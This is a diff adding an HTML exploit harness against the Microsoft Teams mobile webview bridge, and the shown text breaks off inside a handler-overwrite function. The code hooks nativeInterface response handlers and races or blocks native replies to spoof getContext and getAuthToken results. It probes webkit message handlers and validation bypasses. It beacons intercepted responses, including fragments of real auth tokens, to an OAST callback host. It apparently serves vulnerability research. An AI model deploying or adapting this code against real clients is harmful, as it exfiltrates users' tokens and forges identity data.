@@ -1,0 +1,1118 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bridge Escalation</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:'Cascadia Code','SF Mono',monospace; background:#0d1117; color:#c9d1d9; padding:6px; font-size:10px; }
+  #out { background:#161b22; padding:6px; border-radius:6px; white-space:pre-wrap; word-break:break-all; max-height:65vh; overflow-y:auto; }
+  .ok { color:#3fb950; } .fail { color:#f85149; } .warn { color:#d29922; } .info { color:#58a6ff; } .crit { color:#f0883e; font-weight:bold; }
+  .section { margin:4px 0 2px; padding:3px; background:#21262d; border-radius:4px; }
+  .section b { font-size:11px; }
+  button { background:#21262d; color:#c9d1d9; border:1px solid #30363d; padding:5px 8px; margin:2px; border-radius:4px; cursor:pointer; font-size:9px; }
+  .p1 b { color:#f85149; } .p1 button { border-color:#f85149; color:#f85149; }
+  .p2 b { color:#f0883e; } .p2 button { border-color:#f0883e; color:#f0883e; }
+  .p3 b { color:#d29922; } .p3 button { border-color:#d29922; color:#d29922; }
+  .p4 b { color:#3fb950; } .p4 button { border-color:#3fb950; color:#3fb950; }
+  .p5 b { color:#bc8cff; } .p5 button { border-color:#bc8cff; color:#bc8cff; }
+  .p6 b { color:#58a6ff; } .p6 button { border-color:#58a6ff; color:#58a6ff; }
+</style>
+</head>
+<body>
+
+<div class="section p1"><b>P1: SDK PROMISE SPOOFING (prove callback receives fake value)</b></div>
+<div class="p1">
+  <button onclick="p1SpoofGetContext()">P1a: spoof getContext</button>
+  <button onclick="p1SpoofAuthToken()">P1b: spoof getAuthToken</button>
+  <button onclick="p1SpoofWithRace()">P1c: race condition spoof</button>
+</div>
+
+<div class="section p2"><b>P2: WEBKIT LISTENER DIRECT (lower-level bridge)</b></div>
+<div class="p2">
+  <button onclick="p2ProbeListener()">P2a: probe listener</button>
+  <button onclick="p2SendGetContext()">P2b: getContext via listener</button>
+  <button onclick="p2SendDeepLink()">P2c: deepLink via listener</button>
+  <button onclick="p2CompareChannels()">P2d: compare channels</button>
+</div>
+
+<div class="section p3"><b>P3: 3-PATH COMPARISON (framelessPM vs sdkRequest vs processMsgReq)</b></div>
+<div class="p3">
+  <button onclick="p3CompareAll()">P3a: compare 6 funcs × 3 paths</button>
+  <button onclick="p3ValidationBypass()">P3b: validation bypass test</button>
+</div>
+
+<div class="section p4"><b>P4: HANDLER OVERWRITE (observable effect)</b></div>
+<div class="p4">
+  <button onclick="p4OverwritePending()">P4a: overwrite pending callback</button>
+  <button onclick="p4HijackHandler()">P4b: hijack registered handler</button>
+  <button onclick="p4InjectDialogMsg()">P4c: inject messageForChild</button>
+</div>
+
+<div class="section p5"><b>P5: FILE PREVIEW ESCALATION (parser surface)</b></div>
+<div class="p5">
+  <button onclick="p5FileTest(1)">P5a: PDF</button>
+  <button onclick="p5FileTest(2)">P5b: DOCX</button>
+  <button onclick="p5FileTest(3)">P5c: HTML-as-SVG</button>
+  <button onclick="p5FileTest(4)">P5d: redirect chain</button>
+  <button onclick="p5FileTest(5)">P5e: large + range</button>
+  <button onclick="p5FileTest(6)">P5f: SVG ext-ref</button>
+</div>
+
+<div class="section p6"><b>P6: UPLOAD CUSTOM APP (manifest probe)</b></div>
+<div class="p6">
+  <button onclick="p6UploadInvalid()">P6a: invalid manifest</button>
+  <button onclick="p6UploadMinimal()">P6b: minimal valid manifest</button>
+</div>
+
+<div style="margin:4px 0;">
+  <button onclick="copyOut()">COPY LOG</button>
+  <button onclick="el.textContent=''">CLEAR</button>
+</div>
+<div id="out" style="margin-top:4px;"></div>
+
+<script>
+var el = document.getElementById('out');
+var C = 'o21c1mes8ezi4ox5wz9mmhhpikwlgcwi8.oast.site';
+var msgId = 3000;
+var NI = null;
+var SDK_READY = false;
+var CTX = null;
+
+function log(m, cls) {
+  var span = document.createElement('span');
+  span.className = cls || '';
+  span.textContent = m + '\n';
+  el.appendChild(span);
+  el.scrollTop = el.scrollHeight;
+}
+
+function ex(path, data) {
+  var p = Object.keys(data).map(function(k) {
+    return k + '=' + encodeURIComponent(String(data[k] || '').substring(0, 500));
+  }).join('&');
+  fetch('https://' + C + '/' + path + '?' + p).catch(function() {
+    new Image().src = 'https://' + C + '/' + path + '?' + p;
+  });
+}
+
+function copyOut() {
+  navigator.clipboard.writeText(el.textContent).catch(function(){});
+  log('[copied]', 'info');
+}
+
+function safStr(obj, d) {
+  if (d === undefined) d = 2;
+  if (d <= 0) return String(obj);
+  if (obj === null) return 'null';
+  if (obj === undefined) return 'undefined';
+  var t = typeof obj;
+  if (t === 'string') return '"' + obj.substring(0, 400) + '"';
+  if (t === 'number' || t === 'boolean') return String(obj);
+  if (t === 'function') return '[fn ' + (obj.name || '?') + ']';
+  if (Array.isArray(obj)) return '[' + obj.slice(0,10).map(function(v){return safStr(v,d-1)}).join(', ') + ']';
+  if (t === 'object') {
+    var k; try{k=Object.getOwnPropertyNames(obj)}catch(e){try{k=Object.keys(obj)}catch(e2){return '[obj]'}}
+    return '{' + k.slice(0,25).map(function(p){try{return p+':'+safStr(obj[p],d-1)}catch(e){return p+':err'}}).join(', ') + '}';
+  }
+  return String(obj);
+}
+
+// ================================================================
+// PHASE 0: CAPTURE BRIDGE + HOOK RESPONSES (before SDK init)
+// ================================================================
+var interceptedResponses = [];
+
+if (window.nativeInterface) {
+  NI = window.nativeInterface;
+
+  var origHandle = NI.handleResponseFromNative;
+  NI.handleResponseFromNative = function() {
+    var args = Array.from(arguments);
+    var parsed = null;
+    try { parsed = JSON.parse(args[0]); } catch(e) { parsed = args[0]; }
+    interceptedResponses.push({ ts: Date.now(), raw: args, parsed: parsed });
+    log('[INTERCEPT] ' + safStr(args, 3).substring(0, 600), 'crit');
+    ex('t16-intercept', { data: safStr(args, 3).substring(0, 500) });
+    if (origHandle) return origHandle.apply(this, arguments);
+  };
+
+  var origPartial = NI.handlePartialResponseFromNative;
+  NI.handlePartialResponseFromNative = function() {
+    log('[PARTIAL] ' + safStr(Array.from(arguments), 3).substring(0, 400), 'crit');
+    if (origPartial) return origPartial.apply(this, arguments);
+  };
+
+  var origHandler = NI.handleResponseHandlerFromNative;
+  NI.handleResponseHandlerFromNative = function() {
+    log('[HANDLER] ' + safStr(Array.from(arguments), 3).substring(0, 400), 'crit');
+    if (origHandler) return origHandler.apply(this, arguments);
+  };
+}
+
+function bridgeSend(func, args) {
+  var id = msgId++;
+  var request = { id: id, func: func, args: args || [], timestamp: Date.now(), apiVersionTag: 'v2_' + func };
+  if (NI && NI.framelessPostMessage) {
+    try {
+      NI.framelessPostMessage(JSON.stringify(request));
+      return id;
+    } catch(e) {
+      log('bridgeSend error: ' + e.message, 'fail');
+    }
+  }
+  return null;
+}
+
+// SDK init
+var sdkScript = document.createElement('script');
+sdkScript.src = 'https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js';
+sdkScript.onload = function() {
+  (async function() {
+    try {
+      await microsoftTeams.app.initialize();
+      CTX = await microsoftTeams.app.getContext();
+      SDK_READY = true;
+      log('SDK OK: ' + CTX.user.userPrincipalName + ' | ' + CTX.app.host.clientType, 'ok');
+      log('NI: ' + (NI ? 'captured (' + Object.getOwnPropertyNames(NI).length + ' props)' : 'NOT FOUND'), NI ? 'crit' : 'fail');
+      log('webkit.messageHandlers: ' + (window.webkit && window.webkit.messageHandlers ? 'EXISTS' : 'no'), window.webkit ? 'crit' : 'warn');
+    } catch(e) {
+      log('SDK init error: ' + e.message, 'fail');
+    }
+  })();
+};
+document.head.appendChild(sdkScript);
+
+
+// ================================================================
+// P1: SDK PROMISE SPOOFING
+// Goal: prove that a public TeamsJS Promise/.then() receives a fake value
+// ================================================================
+
+function p1SpoofGetContext() {
+  log('\n' + '='.repeat(60), 'info');
+  log('P1a: SPOOF getContext() — prove Promise receives fake data', 'info');
+  log('='.repeat(60), 'info');
+
+  if (!NI) { log('No nativeInterface', 'fail'); return; }
+  if (!SDK_READY) { log('SDK not ready', 'fail'); return; }
+
+  // Strategy: call getContext via the bridge, immediately inject a spoofed
+  // response before the native host can reply, and see if the SDK
+  // delivers our fake data to the callback.
+
+  var spoofId = msgId++;
+  var spoofUPN = 'SPOOFED-ATTACKER@o21c1mes8ezi4ox5wz9mmhhpikwlgcwi8.oast.site.com';
+  var spoofTenant = 'FAKE-TENANT-ID-12345';
+
+  log('Step 1: Sending getContext with id=' + spoofId, 'info');
+
+  // Register our own callback in NI.callbacks to catch the response
+  var callbackFired = false;
+  if (NI.callbacks) {
+    NI.callbacks[spoofId] = function() {
+      callbackFired = true;
+      var cbArgs = Array.from(arguments);
+      log('CALLBACK FIRED with: ' + safStr(cbArgs, 3).substring(0, 500), 'crit');
+      ex('p1a-callback-fired', { args: safStr(cbArgs, 3).substring(0, 500) });
+    };
+  }
+
+  // Send getContext request via bridge
+  var request = {
+    id: spoofId,
+    func: 'getContext',
+    args: [],
+    timestamp: Date.now(),
+    apiVersionTag: 'v2_getContext'
+  };
+  NI.framelessPostMessage(JSON.stringify(request));
+  log('Step 2: Request sent, id=' + spoofId, 'ok');
+
+  // Immediately inject spoofed response (race the native host)
+  log('Step 3: Injecting spoofed response NOW', 'warn');
+
+  var fakeContext = JSON.stringify({
+    user: { userPrincipalName: spoofUPN, id: 'fake-user-id' },
+    app: { host: { clientType: 'ios' } },
+    team: { groupId: spoofTenant }
+  });
+
+  // Try multiple injection methods
+  var methods = [
+    { name: 'handleResponseFromNative', fn: function() {
+      NI.handleResponseFromNative(JSON.stringify({ id: spoofId, args: [null, fakeContext] }));
+    }},
+    { name: 'postSdkResponseWithId', fn: function() {
+      NI.postSdkResponseWithId(spoofId, [null, fakeContext]);
+    }},
+    { name: 'sdkEncodedResponseHandler', fn: function() {
+      NI.sdkEncodedResponseHandler(JSON.stringify({ id: spoofId, args: [null, fakeContext] }));
+    }},
+  ];
+
+  for (var m of methods) {
+    try {
+      m.fn();
+      log('  ' + m.name + ': called', 'ok');
+    } catch(e) {
+      log('  ' + m.name + ': ' + e.message, 'fail');
+    }
+  }
+
+  // Check if callback was fired
+  setTimeout(function() {
+    log('Step 4: callback fired = ' + callbackFired, callbackFired ? 'crit' : 'warn');
+    ex('p1a-result', { callbackFired: callbackFired, spoofId: spoofId });
+  }, 500);
+
+  // Also: call the public SDK and see what it returns
+  log('\nStep 5: Calling microsoftTeams.app.getContext() via public SDK...', 'info');
+  microsoftTeams.app.getContext().then(function(ctx) {
+    log('PUBLIC SDK getContext returned:', 'info');
+    log('  UPN: ' + ctx.user.userPrincipalName, ctx.user.userPrincipalName === spoofUPN ? 'crit' : 'ok');
+    log('  id: ' + ctx.user.id, 'info');
+    log('  host: ' + ctx.app.host.clientType, 'info');
+    if (ctx.user.userPrincipalName === spoofUPN) {
+      log('*** SPOOFING CONFIRMED: SDK returned FAKE UPN ***', 'crit');
+      ex('p1a-spoof-confirmed', { upn: ctx.user.userPrincipalName, tenant: safStr(ctx.team, 1) });
+    } else {
+      log('SDK returned real context (spoof did not override)', 'warn');
+    }
+  }).catch(function(e) {
+    log('getContext error: ' + e.message, 'fail');
+  });
+}
+
+function p1SpoofAuthToken() {
+  log('\n' + '='.repeat(60), 'info');
+  log('P1b: SPOOF getAuthToken — inject fake token into SDK callback', 'info');
+  log('='.repeat(60), 'info');
+
+  if (!NI) { log('No nativeInterface', 'fail'); return; }
+  if (!SDK_READY) { log('SDK not ready', 'fail'); return; }
+
+  var fakeToken = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC9mYWtlLyIsInN1YiI6ImZha2Utc3ViIiwidXBuIjoiYXR0YWNrZXJAZXZpbC5jb20iLCJzY3AiOiJVc2VyLlJlYWQgTWFpbC5SZWFkIiwiZXhwIjo5OTk5OTk5OTk5fQ.fake-signature';
+
+  // Call getAuthToken via public SDK
+  log('Step 1: Calling microsoftTeams.authentication.getAuthToken()...', 'info');
+
+  // We need to find the request ID the SDK uses
+  // Hook framelessPostMessage temporarily to capture the outgoing ID
+  var capturedId = null;
+  var origFPM = NI.framelessPostMessage;
+  NI.framelessPostMessage = function(msg) {
+    try {
+      var parsed = JSON.parse(msg);
+      if (parsed.func && parsed.func.indexOf('getAuthToken') !== -1) {
+        capturedId = parsed.id;
+        log('Step 2: Captured SDK request id=' + capturedId + ' func=' + parsed.func, 'crit');
+
+        // Inject fake response BEFORE forwarding to native
+        setTimeout(function() {
+          log('Step 3: Injecting fake token response for id=' + capturedId, 'warn');
+
+          // Try all injection methods
+          try {
+            NI.handleResponseFromNative(JSON.stringify({
+              id: capturedId,
+              args: [null, fakeToken]
+            }));
+            log('  handleResponseFromNative: injected', 'ok');
+          } catch(e) {
+            log('  handleResponseFromNative: ' + e.message, 'fail');
+          }
+
+          try {
+            NI.postSdkResponseWithId(capturedId, [null, fakeToken]);
+            log('  postSdkResponseWithId: injected', 'ok');
+          } catch(e) {
+            log('  postSdkResponseWithId: ' + e.message, 'fail');
+          }
+        }, 10);
+      }
+    } catch(e) {}
+    return origFPM.apply(this, arguments);
+  };
+
+  microsoftTeams.authentication.getAuthToken().then(function(token) {
+    log('*** getAuthToken() RESOLVED ***', 'crit');
+    log('Token received: ' + String(token).substring(0, 100), 'crit');
+
+    if (String(token).indexOf('fake-signature') !== -1 || String(token) === fakeToken) {
+      log('!!! SPOOFING CONFIRMED: SDK returned FAKE TOKEN !!!', 'crit');
+      ex('p1b-spoof-confirmed', { token: String(token).substring(0, 200), capturedId: capturedId });
+    } else if (token && String(token).indexOf('eyJ') === 0) {
+      log('SDK returned a REAL token (native beat our injection)', 'warn');
+      ex('p1b-real-token', { token: String(token).substring(0, 80), capturedId: capturedId });
+    } else {
+      log('Unexpected response: ' + String(token).substring(0, 200), 'warn');
+      ex('p1b-unexpected', { token: String(token).substring(0, 200) });
+    }
+
+    // Restore original
+    NI.framelessPostMessage = origFPM;
+  }).catch(function(e) {
+    log('getAuthToken rejected: ' + e.message, 'fail');
+    log('  (error may be from native or from our spoofed error)', 'info');
+    ex('p1b-rejected', { error: e.message, capturedId: capturedId });
+    NI.framelessPostMessage = origFPM;
+  });
+}
+
+function p1SpoofWithRace() {
+  log('\n' + '='.repeat(60), 'info');
+  log('P1c: RACE CONDITION — block native, inject fake, prove delivery', 'info');
+  log('='.repeat(60), 'info');
+
+  if (!NI) { log('No nativeInterface', 'fail'); return; }
+  if (!SDK_READY) { log('SDK not ready', 'fail'); return; }
+
+  // Strategy: intercept the outgoing framelessPostMessage, DO NOT forward
+  // it to native, and inject our own response. This guarantees the SDK
+  // only gets our spoofed data.
+
+  var capturedId = null;
+  var origFPM = NI.framelessPostMessage;
+  var fakeUPN = 'RACE-SPOOFED@attacker.com';
+
+  NI.framelessPostMessage = function(msg) {
+    try {
+      var parsed = JSON.parse(msg);
+      if (parsed.func === 'getContext' && !capturedId) {
+        capturedId = parsed.id;
+        log('BLOCKED native send for getContext id=' + capturedId, 'crit');
+
+        // DO NOT forward to native — inject our response instead
+        setTimeout(function() {
+          var fakeResponse = JSON.stringify({
+            id: capturedId,
+            args: [null, JSON.stringify({
+              user: { userPrincipalName: fakeUPN, id: 'race-fake-id' },
+              app: { host: { clientType: 'ios-spoofed' } },
+              team: { groupId: 'race-fake-tenant' },
+              channel: { displayName: 'SPOOFED-CHANNEL' }
+            })]
+          });
+
+          log('Injecting fake response (native never saw the request)', 'warn');
+
+          // Use the ORIGINAL handler (not our hooked one) to avoid double-logging
+          if (origHandle) {
+            origHandle.call(NI, fakeResponse);
+          } else {
+            NI.handleResponseFromNative(fakeResponse);
+          }
+          log('Fake response injected', 'ok');
+        }, 50);
+
+        return; // DROP the message — native never sees it
+      }
+    } catch(e) {}
+    // Forward all other messages normally
+    return origFPM.apply(this, arguments);
+  };
+
+  // Save reference to original handle for injection
+  var origHandle = null;
+  // We need the un-hooked version; our Phase 0 hook wraps it
+  // The origHandle from Phase 0 closure is not accessible here,
+  // so we'll use the current (hooked) handler which will log + forward
+  origHandle = NI.handleResponseFromNative;
+
+  log('Calling microsoftTeams.app.getContext() with blocked native...', 'info');
+
+  microsoftTeams.app.getContext().then(function(ctx) {
+    log('\n*** PUBLIC SDK getContext() RESULT ***', 'crit');
+    log('  UPN: ' + (ctx.user ? ctx.user.userPrincipalName : 'N/A'), 'crit');
+    log('  host: ' + (ctx.app ? ctx.app.host.clientType : 'N/A'), 'crit');
+    log('  channel: ' + (ctx.channel ? ctx.channel.displayName : 'N/A'), 'crit');
+
+    var spoofed = ctx.user && ctx.user.userPrincipalName === fakeUPN;
+    if (spoofed) {
+      log('\n!!! RACE SPOOF CONFIRMED !!!', 'crit');
+      log('The public microsoftTeams.app.getContext() Promise resolved', 'crit');
+      log('with ATTACKER-CONTROLLED data. The native host NEVER saw', 'crit');
+      log('the request — attacker blocked it and injected fake response.', 'crit');
+      ex('p1c-race-confirmed', {
+        upn: ctx.user.userPrincipalName,
+        host: ctx.app.host.clientType,
+        channel: ctx.channel ? ctx.channel.displayName : ''
+      });
+    } else {
+      log('SDK returned real context (race failed or second call)', 'warn');
+      ex('p1c-race-failed', { upn: ctx.user ? ctx.user.userPrincipalName : 'unknown' });
+    }
+
+    // Restore
+    NI.framelessPostMessage = origFPM;
+  }).catch(function(e) {
+    log('getContext error: ' + e.message, 'fail');
+    NI.framelessPostMessage = origFPM;
+  });
+
+  // Timeout safety — restore after 5s
+  setTimeout(function() { NI.framelessPostMessage = origFPM; }, 5000);
+}
+
+
+// ================================================================
+// P2: WEBKIT LISTENER DIRECT
+// ================================================================
+
+function p2ProbeListener() {
+  log('\n' + '='.repeat(60), 'info');
+  log('P2a: PROBE window.webkit.messageHandlers.listener', 'info');
+  log('='.repeat(60), 'info');
+
+  log('window.webkit: ' + (typeof window.webkit), window.webkit ? 'ok' : 'fail');
+  if (!window.webkit) { return; }
+
+  log('window.webkit.messageHandlers: ' + (typeof window.webkit.messageHandlers), 'info');
+  if (!window.webkit.messageHandlers) { return; }
+
+  // Enumerate all handlers
+  var handlers = window.webkit.messageHandlers;
+  var names;
+  try { names = Object.getOwnPropertyNames(handlers); } catch(e) { names = []; }
+  log('OwnPropertyNames: ' + (names.length > 0 ? names.join(', ') : '(empty)'), names.length > 0 ? 'crit' : 'warn');
+
+  try {
+    var keys = Object.keys(handlers);
+    if (keys.length > 0) log('Object.keys: ' + keys.join(', '), 'crit');
+  } catch(e) {}
+
+  // Check specific known handlers
+  var knownNames = ['listener', 'nativeProcess', 'teamsHandler', 'bridge',
+    'log', 'telemetry', 'auth', 'native', 'webview', 'app',
+    'messageHandler', 'callHandler', 'notificationHandler'];
+
+  for (var n of knownNames) {
+    try {
+      var h = handlers[n];
+      if (h) {
+        log('  handlers.' + n + ': EXISTS (' + typeof h + ')', 'crit');
+        if (h.postMessage) {
+          log('    .postMessage: ' + typeof h.postMessage, 'crit');
+        }
+        ex('p2a-handler-found', { name: n, type: typeof h, hasPostMessage: !!(h.postMessage) });
+      }
+    } catch(e) {
+      log('  handlers.' + n + ': ' + e.message, 'fail');
+    }
+  }
+
+  // Check listener specifically
+  if (handlers.listener) {
+    log('\n--- listener handler details ---', 'info');
+    var listener = handlers.listener;
+    try {
+      var lProps = Object.getOwnPropertyNames(listener);
+      log('listener props: ' + (lProps.length > 0 ? lProps.join(', ') : '(empty)'), 'info');
+    } catch(e) {}
+    try {
+      var proto = Object.getPrototypeOf(listener);
+      if (proto) {
+        var pProps = Object.getOwnPropertyNames(proto);
+        log('listener proto: ' + pProps.join(', '), pProps.length > 0 ? 'crit' : 'info');
+      }
+    } catch(e) {}
+  }
+}
+
+function p2SendGetContext() {
+  log('\n' + '='.repeat(60), 'info');
+  log('P2b: SEND getContext VIA webkit.messageHandlers.listener', 'info');
+  log('='.repeat(60), 'info');
+
+  if (!window.webkit || !window.webkit.messageHandlers || !window.webkit.messageHandlers.listener) {
+    log('webkit.messageHandlers.listener NOT AVAILABLE', 'fail');
+    return;
+  }
+
+  var listener = window.webkit.messageHandlers.listener;
+  var id = msgId++;
+
+  // Try different message formats
+  var formats = [
+    // Format 1: same as framelessPostMessage
+    { name: 'SDK format', payload: JSON.stringify({
+      id: id, func: 'getContext', args: [], timestamp: Date.now(), apiVersionTag: 'v2_getContext'
+    })},
+    // Format 2: bridge setup format (from notifyBridgeSetup source)
+    { name: 'bridge setup', payload: JSON.stringify({ bridge: 'setup' }) },
+    // Format 3: log format
+    { name: 'log format', payload: JSON.stringify({ type: 'log', message: 'p2-test', level: 'info' }) },
+    // Format 4: raw string
+    { name: 'raw string', payload: 'getContext' },
+    // Format 5: array format
+    { name: 'array format', payload: JSON.stringify([id, 'getContext', []]) },
+    // Format 6: wrapped in msg
+    { name: 'msg wrapped', payload: JSON.stringify({ msg: JSON.stringify({
+      id: id + 1, func: 'getContext', args: [], timestamp: Date.now()
+    })})},
+  ];
+
+  for (var f of formats) {
+    log('\n--- ' + f.name + ' ---', 'info');
+    try {
+      var result = listener.postMessage(f.payload);
+      log('  postMessage returned: ' + safStr(result, 2), result !== undefined ? 'crit' : 'ok');
+      ex('p2b-sent', { format: f.name, result: safStr(result, 1) });
+    } catch(e) {
+      log('  postMessage error: ' + e.message, 'fail');
+      ex('p2b-error', { format: f.name, error: e.message });
+    }
+  }
+
+  log('\nCheck intercepted responses above for any replies...', 'warn');
+}
+
+function p2SendDeepLink() {
+  log('\n' + '='.repeat(60), 'info');
+  log('P2c: SEND executeDeepLink VIA webkit listener', 'info');
+  log('='.repeat(60), 'info');
+
+  if (!window.webkit || !window.webkit.messageHandlers || !window.webkit.messageHandlers.listener) {
+    log('listener not available', 'fail');
+    return;
+  }
+
+  var listener = window.webkit.messageHandlers.listener;
+  var id = msgId++;
+
+  try {
+    var payload = JSON.stringify({
+      id: id,
+      func: 'executeDeepLink',
+      args: ['https://' + C + '/p2c-webkit-deeplink'],
+      timestamp: Date.now(),
+      apiVersionTag: 'v2_executeDeepLink'
+    });
+    var result = listener.postMessage(payload);
+    log('executeDeepLink via listener: sent (result=' + safStr(result, 1) + ')', 'ok');
+    ex('p2c-sent', { id: id });
+  } catch(e) {
+    log('Error: ' + e.message, 'fail');
+  }
+
+  log('Check OAST for /p2c-webkit-deeplink callback', 'warn');
+}
+
+function p2CompareChannels() {
+  log('\n' + '='.repeat(60), 'info');
+  log('P2d: COMPARE — same request via 3 channels', 'info');
+  log('='.repeat(60), 'info');
+
+  if (!NI) { log('No nativeInterface', 'fail'); return; }
+
+  var testFunc = 'executeDeepLink';
+  var testArgs = ['https://' + C + '/p2d-compare'];
+
+  // Channel 1: framelessPostMessage
+  var id1 = msgId++;
+  log('--- Channel 1: framelessPostMessage ---', 'info');
+  try {
+    NI.framelessPostMessage(JSON.stringify({
+      id: id1, func: testFunc, args: testArgs, timestamp: Date.now(), apiVersionTag: 'v2_' + testFunc
+    }));
+    log('  sent id=' + id1, 'ok');
+    ex('p2d-ch1', { id: id1, channel: 'framelessPostMessage' });
+  } catch(e) { log('  error: ' + e.message, 'fail'); }
+
+  // Channel 2: sdkRequest
+  var id2 = msgId++;
+  log('--- Channel 2: sdkRequest ---', 'info');
+  try {
+    var result2 = NI.sdkRequest(JSON.stringify({
+      id: id2, func: testFunc, args: testArgs, timestamp: Date.now()
+    }));
+    log('  sent id=' + id2 + ' result=' + safStr(result2, 1), 'ok');
+    ex('p2d-ch2', { id: id2, channel: 'sdkRequest', result: safStr(result2, 1) });
+  } catch(e) { log('  error: ' + e.message, 'fail'); }
+
+  // Channel 3: webkit listener
+  var id3 = msgId++;
+  log('--- Channel 3: webkit.messageHandlers.listener ---', 'info');
+  if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.listener) {
+    try {
+      var result3 = window.webkit.messageHandlers.listener.postMessage(JSON.stringify({
+        id: id3, func: testFunc, args: testArgs, timestamp: Date.now(), apiVersionTag: 'v2_' + testFunc
+      }));
+      log('  sent id=' + id3 + ' result=' + safStr(result3, 1), 'ok');
+      ex('p2d-ch3', { id: id3, channel: 'webkit-listener', result: safStr(result3, 1) });
+    } catch(e) { log('  error: ' + e.message, 'fail'); }
+  } else {
+    log('  webkit listener not available', 'fail');
+  }
+
+  log('\nCheck OAST for /p2d-compare — how many of 3 channels delivered?', 'warn');
+}
+
+
+// ================================================================
+// P3: 3-PATH COMPARISON
+// ================================================================
+
+function p3CompareAll() {
+  log('\n' + '='.repeat(60), 'info');
+  log('P3a: COMPARE 6 functions × 3 transport methods', 'info');
+  log('='.repeat(60), 'info');
+
+  if (!NI) { log('No nativeInterface', 'fail'); return; }
+
+  var funcs = [
+    { func: 'getContext', args: [] },
+    { func: 'executeDeepLink', args: ['https://' + C + '/p3a-deeplink'] },
+    { func: 'openFilePreview', args: ['p3-test', 'test.txt', 'test', 'txt',
+      'https://' + C + '/p3a-preview', 'https://' + C + '/p3a-dl', '', '', '', false, '', 'view', 0, '', 100, '', '', '', '', ''] },
+    { func: 'authentication.authenticate', args: [{ url: 'https://' + C + '/p3a-auth', width: 400, height: 400 }] },
+    { func: 'permissions.has', args: ['media'] },
+    { func: 'uploadCustomApp', args: ['{}'] },
+  ];
+
+  var methods = [
+    { name: 'framelessPostMessage', send: function(id, func, args) {
+      NI.framelessPostMessage(JSON.stringify({ id: id, func: func, args: args, timestamp: Date.now(), apiVersionTag: 'v2_' + func }));
+    }},
+    { name: 'sdkRequest', send: function(id, func, args) {
+      return NI.sdkRequest(JSON.stringify({ id: id, func: func, args: args, timestamp: Date.now() }));
+    }},
+    { name: 'processMessageRequest', send: function(id, func, args) {
+      return NI.processMessageRequest(JSON.stringify({ id: id, func: func, args: args }));
+    }},
+  ];
+
+  for (var f of funcs) {
+    log('\n--- ' + f.func + ' ---', 'info');
+    for (var m of methods) {
+      var id = msgId++;
+      try {
+        var result = m.send(id, f.func, f.args);
+        log('  ' + m.name + ' id=' + id + ': OK' + (result !== undefined ? ' ret=' + safStr(result, 1).substring(0, 80) : ''), 'ok');
+        ex('p3a-' + f.func.replace(/\./g, '-') + '-' + m.name.substring(0, 8), { id: id, status: 'ok' });
+      } catch(e) {
+        log('  ' + m.name + ' id=' + id + ': ERROR ' + e.message.substring(0, 60), 'fail');
+        ex('p3a-' + f.func.replace(/\./g, '-') + '-' + m.name.substring(0, 8), { id: id, status: 'error', msg: e.message.substring(0, 100) });
+      }
+    }
+  }
+}
+
+function p3ValidationBypass() {
+  log('\n' + '='.repeat(60), 'info');
+  log('P3b: VALIDATION BYPASS — isValidSdkRequest vs actual processing', 'info');
+  log('='.repeat(60), 'info');
+
+  if (!NI) { log('No nativeInterface', 'fail'); return; }
+
+  // Craft messages that might fail validation but still be processed
+  var probes = [
+    { name: 'missing id', msg: { func: 'getContext', args: [], timestamp: Date.now() } },
+    { name: 'missing func', msg: { id: msgId++, args: [], timestamp: Date.now() } },
+    { name: 'missing timestamp', msg: { id: msgId++, func: 'getContext', args: [] } },
+    { name: 'missing args', msg: { id: msgId++, func: 'getContext', timestamp: Date.now() } },
+    { name: 'extra fields', msg: { id: msgId++, func: 'getContext', args: [], timestamp: Date.now(), secret: 'test', admin: true } },
+    { name: 'negative id', msg: { id: -1, func: 'getContext', args: [], timestamp: Date.now() } },
+    { name: 'string id', msg: { id: 'abc', func: 'getContext', args: [], timestamp: Date.now() } },
+    { name: 'func with /', msg: { id: msgId++, func: '../getAuthToken', args: [], timestamp: Date.now() } },
+    { name: 'empty func', msg: { id: msgId++, func: '', args: [], timestamp: Date.now() } },
+    { name: 'proto pollution', msg: { id: msgId++, func: 'getContext', args: [], timestamp: Date.now(), __proto__: { admin: true } } },
+  ];
+
+  for (var p of probes) {
+    var serialized = JSON.stringify(p.msg);
+    var valid = null;
+    var fpmOk = null;
+    var sdkOk = null;
+    var pmrOk = null;
+
+    try { valid = NI.isValidSdkRequest(serialized); } catch(e) { valid = 'err:' + e.message.substring(0, 30); }
+    try { NI.framelessPostMessage(serialized); fpmOk = true; } catch(e) { fpmOk = 'err:' + e.message.substring(0, 30); }
+    try { var r = NI.sdkRequest(serialized); sdkOk = r !== undefined ? 'ret:' + safStr(r, 0).substring(0, 20) : true; } catch(e) { sdkOk = 'err:' + e.message.substring(0, 30); }
+    try { var r2 = NI.processMessageRequest(serialized); pmrOk = r2 !== undefined ? 'ret:' + safStr(r2, 0).substring(0, 20) : true; } catch(e) { pmrOk = 'err:' + e.message.substring(0, 30); }
+
+    var bypass = (valid === false && (fpmOk === true || sdkOk === true || pmrOk === true));
+    log('  ' + p.name + ': valid=' + valid + ' fpm=' + fpmOk + ' sdk=' + sdkOk + ' pmr=' + pmrOk +
+      (bypass ? ' *** BYPASS ***' : ''), bypass ? 'crit' : 'info');
+
+    if (bypass) {
+      ex('p3b-bypass', { probe: p.name, valid: String(valid), fpm: String(fpmOk), sdk: String(sdkOk), pmr: String(pmrOk) });
+    }
+  }
+}
+
+
+// ================================================================
+// P4: HANDLER OVERWRITE WITH OBSERVABLE EFFECT
+// ================================================================
+
+function p4OverwritePending() {
+  log('\n' + '='.repeat(60), 'info');
+  log('P4a: OVERWRITE PENDING CALLBACK — prove real callback receives manipulated data', 'info');
+  log('='.repeat(60), 'info');
+
+  if (!NI) { log('No nativeInterface', 'fail'); return; }
+  if (!SDK_READY) { log('SDK not ready', 'fail'); return; }
+
+  // Strategy: make a real SDK call, find its ID in callbacks, replace
+  // the callback with our own, and prove the native response gets
+  // delivered to our code instead of the SDK's.
+
+  log('Step 1: Making real SDK call and capturing its callback ID...', 'info');
+
+  // Hook framelessPostMessage to capture the outgoing request ID
+  var realId = null;
